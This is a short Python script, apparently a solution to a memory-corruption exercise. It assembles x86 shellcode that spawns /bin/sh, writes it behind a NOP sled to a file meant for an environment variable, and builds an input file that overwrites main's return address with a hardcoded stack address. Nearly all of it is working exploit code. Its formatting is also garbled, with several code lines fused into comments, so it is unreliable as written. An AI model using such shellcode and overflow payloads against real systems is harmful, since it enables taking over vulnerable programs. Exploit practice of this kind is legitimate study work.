import struct

# First add a massive nop slide to some shellcode as an environment variable.
# Then override the main functions return value to point somewhere in the nop
# slide.


        # xor ecx, ecx
shell  = '\x31'shell += '\xc9'
        # mul ecx        # shell += '\xf7'
        # shell += '\xe1'        # push ecx
shell += '\x51'        # push 0x68732f2f   ;; hs//
shell += '\x68'shell += '\x2f\x2f\x73\x68'
        # push 0x6e69622f   ;; nib/shell += '\x68'
shell += '\x2f\x62\x69\x6e'
        # mov ebx, esp
shell += '\x89'
shell += '\xe3'
        # mov al, 11
shell += '\xb0'
shell += '\x0b'
shell += '\xcd'
        # int 0x80shell += '\x80'
        # len(shell) == 21 (new === 19)
        # overwrite main's return pointer (ebp + 8) at len 44
        # len first == 20
        # len second == 20
        # read 0x1000
        # a = shell + ('a' * (20 - len(shell))) + '\n'
a = 'a'*20 + '\n'
        # b = ('a' * 9) + struct.pack("<I", 0xbffffec5) + ('a' * 7) + '\n'
b = ('a' * 1) + struct.pack("<I", 0xbffffec5) * 4 + ('a' * 3) + '\n'

open('shellcode_env', "w+").write('\x90' * 100 + shell)
open('input', "w+").write(a + ('a' * (0x1000-21)) + b)

